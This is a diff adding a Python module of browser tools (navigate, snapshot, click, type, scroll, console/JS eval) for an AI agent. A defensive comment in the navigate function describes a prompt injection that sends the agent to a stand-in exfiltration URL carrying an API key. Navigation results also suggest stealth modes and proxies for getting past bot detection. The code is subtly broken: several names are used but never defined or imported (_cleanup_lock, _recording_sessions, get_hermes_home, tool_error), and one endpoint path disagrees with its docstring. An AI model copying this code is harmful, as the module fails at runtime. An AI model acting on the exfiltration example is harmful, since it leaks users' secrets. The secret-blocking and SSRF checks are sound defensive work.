+++ tools/browser_actions.py
@@ -1,0 +1,619 @@
+"""Core browser actions — navigate, snapshot, click, type, scroll, back, press, console."""
+
+import json
+import logging
+import os
+import re
+import time
+from typing import Optional
+
+from agent.auxiliary_client import call_llm
+
+from tools.browser_state import active_sessions, session_last_activity, cleanup_lock, recording_sessions
+from tools.browser_utils import (
+    _get_command_timeout,
+    _allow_private_urls,
+    _is_local_backend,
+    _is_gurbridge_mode,
+    _is_camofox_mode,
+    _is_safe_url,
+    check_website_access,
+    SNAPSHOT_SUMMARIZE_THRESHOLD,
+    logger,
+)
+from tools.browser_session import _get_session_info, _update_session_activity, _create_local_session, _create_cdp_session
+from tools.browser_local import _run_browser_command, _truncate_snapshot, _extract_relevant_content
+
+def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
+    """
+    Navigate to a URL in the browser.
+    
+    Args:
+        url: The URL to navigate to
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with navigation result (includes stealth features info on first nav)
+    """
+    # Secret exfiltration protection — block URLs that embed API keys or
+    # tokens in query parameters. A prompt injection could trick the agent
+    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
+    import urllib.parse
+    from agent.redact import _PREFIX_RE
+    url_decoded = urllib.parse.unquote(url)
+    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL contains what appears to be an API key or token. "
+                     "Secrets must not be sent in URLs.",
+        })
+
+    # SSRF protection — block private/internal addresses before navigating.
+    # Skipped for local backends (Camofox, headless Chromium without a cloud
+    # provider) because the agent already has full local network access via
+    # the terminal tool.  Can also be opted out for cloud mode via
+    # ``browser.allow_private_urls`` in config.
+    if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL targets a private or internal address",
+        })
+
+    # Website policy check — block before navigating
+    blocked = check_website_access(url)
+    if blocked:
+        return json.dumps({
+            "success": False,
+            "error": blocked["message"],
+            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
+        })
+
+    # Gurbridge backend — delegate to visible IDE browser
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_navigate
+        return gurbridge_navigate(url, task_id)
+
+    # Camofox backend — delegate after safety checks pass
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_navigate
+        return camofox_navigate(url, task_id)
+
+    effective_task_id = task_id or "default"
+    
+    # Get session info to check if this is a new session
+    # (will create one with features logged if not exists)
+    session_info = _get_session_info(effective_task_id)
+    is_first_nav = session_info.get("_first_nav", True)
+    
+    # Auto-start recording if configured and this is first navigation
+    if is_first_nav:
+        session_info["_first_nav"] = False
+        _maybe_start_recording(effective_task_id)
+    
+    result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
+    
+    if result.get("success"):
+        data = result.get("data", {})
+        title = data.get("title", "")
+        final_url = data.get("url", url)
+
+        # Post-redirect SSRF check — if the browser followed a redirect to a
+        # private/internal address, block the result so the model can't read
+        # internal content via subsequent browser_snapshot calls.
+        # Skipped for local backends (same rationale as the pre-nav check).
+        if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
+            # Navigate away to a blank page to prevent snapshot leaks
+            _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: redirect landed on a private/internal address",
+            })
+
+        response = {
+            "success": True,
+            "url": final_url,
+            "title": title
+        }
+        
+        # Detect common "blocked" page patterns from title/url
+        blocked_patterns = [
+            "access denied", "access to this page has been denied",
+            "blocked", "bot detected", "verification required",
+            "please verify", "are you a robot", "captcha",
+            "cloudflare", "ddos protection", "checking your browser",
+            "just a moment", "attention required"
+        ]
+        title_lower = title.lower()
+        
+        if any(pattern in title_lower for pattern in blocked_patterns):
+            response["bot_detection_warning"] = (
+                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
+                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
+                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
+                "4) Some sites have very aggressive bot detection that may be unavoidable."
+            )
+        
+        # Include feature info on first navigation so model knows what's active
+        if is_first_nav and "features" in session_info:
+            features = session_info["features"]
+            active_features = [k for k, v in features.items() if v]
+            if not features.get("proxies"):
+                response["stealth_warning"] = (
+                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
+                    "Consider upgrading Browserbase plan for proxy support."
+                )
+            response["stealth_features"] = active_features
+
+        # Auto-take a compact snapshot so the model can act immediately
+        # without a separate browser_snapshot call.
+        try:
+            snap_result = _run_browser_command(effective_task_id, "snapshot", ["-c"])
+            if snap_result.get("success"):
+                snap_data = snap_result.get("data", {})
+                snapshot_text = snap_data.get("snapshot", "")
+                refs = snap_data.get("refs", {})
+                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
+                    snapshot_text = _truncate_snapshot(snapshot_text)
+                response["snapshot"] = snapshot_text
+                response["element_count"] = len(refs) if refs else 0
+        except Exception as e:
+            logger.debug("Auto-snapshot after navigate failed: %s", e)
+
+        return json.dumps(response, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", "Navigation failed")
+        }, ensure_ascii=False)
+
+
+def browser_snapshot(
+    full: bool = False,
+    task_id: Optional[str] = None,
+    user_task: Optional[str] = None
+) -> str:
+    """
+    Get a text-based snapshot of the current page's accessibility tree.
+    
+    Args:
+        full: If True, return complete snapshot. If False, return compact view.
+        task_id: Task identifier for session isolation
+        user_task: The user's current task (for task-aware extraction)
+        
+    Returns:
+        JSON string with page snapshot
+    """
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_snapshot
+        return gurbridge_snapshot(full, task_id, user_task)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_snapshot
+        return camofox_snapshot(full, task_id, user_task)
+
+    effective_task_id = task_id or "default"
+    
+    # Build command args based on full flag
+    args = []
+    if not full:
+        args.extend(["-c"])  # Compact mode
+    
+    result = _run_browser_command(effective_task_id, "snapshot", args)
+    
+    if result.get("success"):
+        data = result.get("data", {})
+        snapshot_text = data.get("snapshot", "")
+        refs = data.get("refs", {})
+        
+        # Check if snapshot needs summarization
+        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
+            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
+        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
+            snapshot_text = _truncate_snapshot(snapshot_text)
+        
+        response = {
+            "success": True,
+            "snapshot": snapshot_text,
+            "element_count": len(refs) if refs else 0
+        }
+        
+        return json.dumps(response, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", "Failed to get snapshot")
+        }, ensure_ascii=False)
+
+
+def browser_click(ref: str, task_id: Optional[str] = None) -> str:
+    """
+    Click on an element.
+    
+    Args:
+        ref: Element reference (e.g., "@e5")
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with click result
+    """
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_click
+        return gurbridge_click(ref, task_id)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_click
+        return camofox_click(ref, task_id)
+
+    effective_task_id = task_id or "default"
+    
+    # Ensure ref starts with @
+    if not ref.startswith("@"):
+        ref = f"@{ref}"
+    
+    result = _run_browser_command(effective_task_id, "click", [ref])
+    
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "clicked": ref
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to click {ref}")
+        }, ensure_ascii=False)
+
+
+def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
+    """
+    Type text into an input field.
+    
+    Args:
+        ref: Element reference (e.g., "@e3")
+        text: Text to type
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with type result
+    """
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_type
+        return gurbridge_type(ref, text, task_id)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_type
+        return camofox_type(ref, text, task_id)
+
+    effective_task_id = task_id or "default"
+    
+    # Ensure ref starts with @
+    if not ref.startswith("@"):
+        ref = f"@{ref}"
+    
+    # Use fill command (clears then types)
+    result = _run_browser_command(effective_task_id, "fill", [ref, text])
+    
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "typed": text,
+            "element": ref
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to type into {ref}")
+        }, ensure_ascii=False)
+
+
+def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
+    """
+    Scroll the page.
+    
+    Args:
+        direction: "up" or "down"
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with scroll result
+    """
+    # Validate direction
+    if direction not in ["up", "down"]:
+        return json.dumps({
+            "success": False,
+            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
+        }, ensure_ascii=False)
+
+    # Single scroll with pixel amount instead of 5x subprocess calls.
+    # agent-browser supports: agent-browser scroll down 500
+    # ~500px is roughly half a viewport of travel.
+    _SCROLL_PIXELS = 500
+
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_scroll
+        return gurbridge_scroll(direction, task_id)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_scroll
+        # Camofox REST API doesn't support pixel args; use repeated calls
+        _SCROLL_REPEATS = 5
+        result = None
+        for _ in range(_SCROLL_REPEATS):
+            result = camofox_scroll(direction, task_id)
+        return result
+
+    effective_task_id = task_id or "default"
+
+    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
+    if not result.get("success"):
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to scroll {direction}")
+        }, ensure_ascii=False)
+
+    return json.dumps({
+        "success": True,
+        "scrolled": direction
+    }, ensure_ascii=False)
+
+
+def browser_back(task_id: Optional[str] = None) -> str:
+    """
+    Navigate back in browser history.
+    
+    Args:
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with navigation result
+    """
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_back
+        return gurbridge_back(task_id)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_back
+        return camofox_back(task_id)
+
+    effective_task_id = task_id or "default"
+    result = _run_browser_command(effective_task_id, "back", [])
+    
+    if result.get("success"):
+        data = result.get("data", {})
+        return json.dumps({
+            "success": True,
+            "url": data.get("url", "")
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", "Failed to go back")
+        }, ensure_ascii=False)
+
+
+def browser_press(key: str, task_id: Optional[str] = None) -> str:
+    """
+    Press a keyboard key.
+    
+    Args:
+        key: Key to press (e.g., "Enter", "Tab")
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with key press result
+    """
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_press
+        return gurbridge_press(key, task_id)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_press
+        return camofox_press(key, task_id)
+
+    effective_task_id = task_id or "default"
+    result = _run_browser_command(effective_task_id, "press", [key])
+    
+    if result.get("success"):
+        return json.dumps({
+            "success": True,
+            "pressed": key
+        }, ensure_ascii=False)
+    else:
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to press {key}")
+        }, ensure_ascii=False)
+
+
+
+
+
+def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
+    """Get browser console messages and JavaScript errors, or evaluate JS in the page.
+    
+    When ``expression`` is provided, evaluates JavaScript in the page context
+    (like the DevTools console) and returns the result.  Otherwise returns
+    console output (log/warn/error/info) and uncaught exceptions.
+    
+    Args:
+        clear: If True, clear the message/error buffers after reading
+        expression: JavaScript expression to evaluate in the page context
+        task_id: Task identifier for session isolation
+        
+    Returns:
+        JSON string with console messages/errors, or eval result
+    """
+    # --- JS evaluation mode ---
+    if expression is not None:
+        return _browser_eval(expression, task_id)
+
+    # --- Console output mode (original behaviour) ---
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_console
+        return gurbridge_console(clear, task_id)
+
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_console
+        return camofox_console(clear, task_id)
+
+    effective_task_id = task_id or "default"
+    
+    console_args = ["--clear"] if clear else []
+    error_args = ["--clear"] if clear else []
+    
+    console_result = _run_browser_command(effective_task_id, "console", console_args)
+    errors_result = _run_browser_command(effective_task_id, "errors", error_args)
+    
+    messages = []
+    if console_result.get("success"):
+        for msg in console_result.get("data", {}).get("messages", []):
+            messages.append({
+                "type": msg.get("type", "log"),
+                "text": msg.get("text", ""),
+                "source": "console",
+            })
+    
+    errors = []
+    if errors_result.get("success"):
+        for err in errors_result.get("data", {}).get("errors", []):
+            errors.append({
+                "message": err.get("message", ""),
+                "source": "exception",
+            })
+    
+    return json.dumps({
+        "success": True,
+        "console_messages": messages,
+        "js_errors": errors,
+        "total_messages": len(messages),
+        "total_errors": len(errors),
+    }, ensure_ascii=False)
+
+
+def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
+    """Evaluate a JavaScript expression in the page context and return the result."""
+    if _is_gurbridge_mode():
+        from tools.browser_gurbridge import gurbridge_eval
+        return gurbridge_eval(expression, task_id)
+
+    if _is_camofox_mode():
+        return _camofox_eval(expression, task_id)
+
+    effective_task_id = task_id or "default"
+    result = _run_browser_command(effective_task_id, "eval", [expression])
+
+    if not result.get("success"):
+        err = result.get("error", "eval failed")
+        # Detect backend capability gaps and give the model a clear signal
+        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
+            return json.dumps({
+                "success": False,
+                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
+            })
+        return json.dumps({
+            "success": False,
+            "error": err,
+        })
+
+    data = result.get("data", {})
+    raw_result = data.get("result")
+
+    # The eval command returns the JS result as a string.  If the string
+    # is valid JSON, parse it so the model gets structured data.
+    parsed = raw_result
+    if isinstance(raw_result, str):
+        try:
+            parsed = json.loads(raw_result)
+        except (json.JSONDecodeError, ValueError):
+            pass  # keep as string
+
+    return json.dumps({
+        "success": True,
+        "result": parsed,
+        "result_type": type(parsed).__name__,
+    }, ensure_ascii=False, default=str)
+
+
+def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
+    """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
+    from tools.browser_camofox import _ensure_tab, _post
+    try:
+        tab_info = _ensure_tab(task_id or "default")
+        tab_id = tab_info.get("tab_id") or tab_info.get("id")
+        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": tab_info["user_id"]})
+
+        # Camofox returns the result in a JSON envelope
+        raw_result = resp.get("result") if isinstance(resp, dict) else resp
+        parsed = raw_result
+        if isinstance(raw_result, str):
+            try:
+                parsed = json.loads(raw_result)
+            except (json.JSONDecodeError, ValueError):
+                pass
+
+        return json.dumps({
+            "success": True,
+            "result": parsed,
+            "result_type": type(parsed).__name__,
+        }, ensure_ascii=False, default=str)
+    except Exception as e:
+        error_msg = str(e)
+        # Graceful degradation — server may not support eval
+        if any(code in error_msg for code in ("404", "405", "501")):
+            return json.dumps({
+                "success": False,
+                "error": "JavaScript evaluation is not supported by this Camofox server. "
+                         "Use browser_snapshot or browser_vision to inspect page state.",
+            })
+        return tool_error(error_msg, success=False)
+
+
+def _maybe_start_recording(task_id: str):
+    """Start recording if browser.record_sessions is enabled in config."""
+    with _cleanup_lock:
+        if task_id in _recording_sessions:
+            return
+    try:
+        from hermes_cli.config import read_raw_config
+        hermes_home = get_hermes_home()
+        cfg = read_raw_config()
+        record_enabled = cfg.get("browser", {}).get("record_sessions", False)
+        
+        if not record_enabled:
+            return
+        
+        recordings_dir = hermes_home / "browser_recordings"
+        recordings_dir.mkdir(parents=True, exist_ok=True)
+        _cleanup_old_recordings(max_age_hours=72)
+        
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"
+        
+        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
+        if result.get("success"):
+            with _cleanup_lock:
+                _recording_sessions.add(task_id)
+            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
+        else:
+            logger.debug("Could not start auto-recording: %s", result.get("error"))
+    except Exception as e:
+        logger.debug("Auto-recording setup failed: %s", e)
+
+
+def _maybe_stop_recording(task_id: str):
+    """Stop recording if one is active for this session."""
+    with _cleanup_lock:
+        if task_id not in _recording_sessions:
+            return
+    try:
+        result = _run_browser_command(task_id, "record", ["stop"])
+        if result.get("success"):
+            path = result.get("data", {}).get("path", "")
+            logger.info("Saved browser recording for session %s: %s", task_id, path)
+    except Exception as e:
+        logger.debug("Could not stop recording for %s: %s", task_id, e)
+    finally:
+        with _cleanup_lock:
+            _recording_sessions.discard(task_id)
+
